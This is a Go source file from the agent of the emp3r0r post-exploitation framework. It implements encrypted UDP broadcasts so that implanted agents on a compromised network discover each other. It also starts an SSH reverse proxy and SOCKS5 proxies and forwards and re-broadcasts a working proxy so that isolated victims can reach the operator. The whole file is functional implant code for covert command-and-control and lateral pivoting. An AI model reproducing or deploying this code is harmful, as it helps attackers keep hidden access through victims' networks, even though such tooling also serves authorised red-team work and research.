package agent

// build +linux

import (
	"context"
	"fmt"
	"log"
	"net"
	"strconv"
	"strings"
	"time"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// ReverseConns record ssh reverse proxy sessions
var ReverseConns = make(map[string]context.CancelFunc)

// BroadcastServer listen on a UDP port for broadcasts
// wait for some other agents to announce their internet proxy
func BroadcastServer(ctx context.Context, cancel context.CancelFunc, port string) (err error) {
	var (
		passProxyCnt int // one time only
	)
	defer cancel()
	bindaddr := ":" + port
	if port == "" {
		bindaddr = ":" + emp3r0r_data.BroadcastPort
	}
	pc, err := net.ListenPacket("udp4", bindaddr)
	if err != nil {
		return
	}
	defer pc.Close()
	log.Println("BroadcastServer started")

	buf := make([]byte, 1024)

	// reverseProxy listener
	// ssh reverse proxy
	go func() {
		err = tun.SSHProxyServer(emp3r0r_data.ReverseProxyPort)
		if err != nil {
			log.Printf("SSHProxyServer: %v", err)
		}
	}()
	// monitor socks5://127.0.0.1:emp3r0r_data.ProxyPort until it works
	go func() {
		// does the proxy work?
		rproxy := fmt.Sprintf("socks5://127.0.0.1:%s", emp3r0r_data.ProxyPort)
		for !tun.IsProxyOK(rproxy) {
			time.Sleep(time.Second)
		}
		emp3r0r_data.AgentProxy = rproxy
		log.Printf("[+] Reverse proxy configured to %s", rproxy)

		// pass the proxy to others
		if emp3r0r_data.AgentProxy == rproxy {
			go passProxy(ctx, cancel, &passProxyCnt)
		}
	}()

	// keep listening for broadcasts
	for ctx.Err() == nil {
		n, addr, err := pc.ReadFrom(buf)
		if err != nil || n == 0 {
			log.Printf("BroadcastServer has read nothing: %v", err)
			continue
		}

		// decrypt broadcast message
		decMsg := tun.AESDecrypt(emp3r0r_data.AESKey, string(buf[:n]))
		if decMsg == "" {
			log.Printf("%x cannot be decrypted", buf[:n])
			continue
		}
		log.Printf("BroadcastServer: %s sent this: %s\n", addr, decMsg)
		if emp3r0r_data.AgentProxy != "" && tun.IsProxyOK(emp3r0r_data.AgentProxy) {
			log.Printf("BroadcastServer: %s already set and working fine\n", emp3r0r_data.AgentProxy)
			continue
		}

		if tun.IsProxyOK(decMsg) {
			emp3r0r_data.AgentProxy = decMsg
			log.Printf("BroadcastServer: %s set as emp3r0r_data.AgentProxy\n", emp3r0r_data.AgentProxy)

			// pass the proxy to others
			go passProxy(ctx, cancel, &passProxyCnt)

		} else {
			log.Printf("Oh crap! %s doen't work, we have to wait for a reverse proxy", decMsg)
		}
	}
	return
}

// passProxy let other agents on our network use our emp3r0r_data.AgentProxy
func passProxy(ctx context.Context, cancel context.CancelFunc, count *int) {
	// one time only
	*count++
	if *count > 1 {
		log.Printf("passProxy count %d, aborting", *count)
		return
	}

	proxyAddr := emp3r0r_data.AgentProxy
	sl := strings.Split(proxyAddr, "//")
	if len(sl) < 2 {
		log.Printf("TCPFwd: invalid proxy addr: %s", proxyAddr)
		return
	}
	go func() {
		if strings.HasPrefix(sl[1], "127.0.0.1") {
			log.Printf("emp3r0r_data.AgentProxy is %s, we are already serving the proxy, let's start broadcasting right away", proxyAddr)
			return
		}
		log.Printf("[+] BroadcastServer: %s will be served here too, let's hope it helps more agents\n", proxyAddr)
		err := tun.TCPFwd(sl[1], emp3r0r_data.ProxyPort, ctx, cancel)
		if err != nil {
			log.Print("TCPFwd: ", err)
		}
	}()
	go StartBroadcast(false, ctx, cancel)
}

// BroadcastMsg send a broadcast message on a network
func BroadcastMsg(msg, dst string) (err error) {
	srcport := strconv.Itoa(util.RandInt(8000, 60000))
	pc, err := net.ListenPacket("udp4", ":"+srcport)
	if err != nil {
		return
	}
	defer pc.Close()

	// send to specified addr by default
	addr, err := net.ResolveUDPAddr("udp4", dst)
	if err != nil {
		return
	}

	// encrypt message
	encMsg := tun.AESEncrypt(emp3r0r_data.AESKey, msg)
	if encMsg == "" {
		return fmt.Errorf("failed to encrypt %s", msg)
	}

	_, err = pc.WriteTo([]byte(encMsg), addr)
	log.Printf("BroadcastMsg: sent %s (%s) to %s", encMsg, msg, dst)
	return
}

func StartBroadcast(start_socks5 bool, ctx context.Context, cancel context.CancelFunc) {
	if start_socks5 {
		// start a socks5 proxy
		err := Socks5Proxy("on", "0.0.0.0:"+emp3r0r_data.ProxyPort)
		if err != nil {
			log.Printf("Socks5Proxy on: %v", err)
			return
		}
		defer func() {
			err := Socks5Proxy("off", "0.0.0.0:"+emp3r0r_data.ProxyPort)
			if err != nil {
				log.Printf("Socks5Proxy off: %v", err)
			}
		}()
	}

	// broadcast interval
	if emp3r0r_data.BroadcastIntervalMax == 0 {
		log.Println("Broadcasting is turned off, aborting")
		return
	}

	defer func() {
		log.Print("Broadcasting stopped")
		cancel()
	}()
	for ctx.Err() == nil {
		log.Print("Broadcasting our proxy...")
		time.Sleep(time.Duration(util.RandInt(emp3r0r_data.BroadcastIntervalMin, emp3r0r_data.BroadcastIntervalMax)) * time.Second)
		ips := tun.IPaddr()
		for _, netip := range ips {
			proxyMsg := fmt.Sprintf("socks5://%s:%s", netip.IP.String(), emp3r0r_data.ProxyPort)
			broadcastAddr := tun.IPbroadcastAddr(netip)
			if broadcastAddr == "" {
				continue
			}
			err := BroadcastMsg(proxyMsg, broadcastAddr+":"+emp3r0r_data.BroadcastPort)
			if err != nil {
				log.Printf("BroadcastMsg failed: %v", err)
			}
		}
	}
}
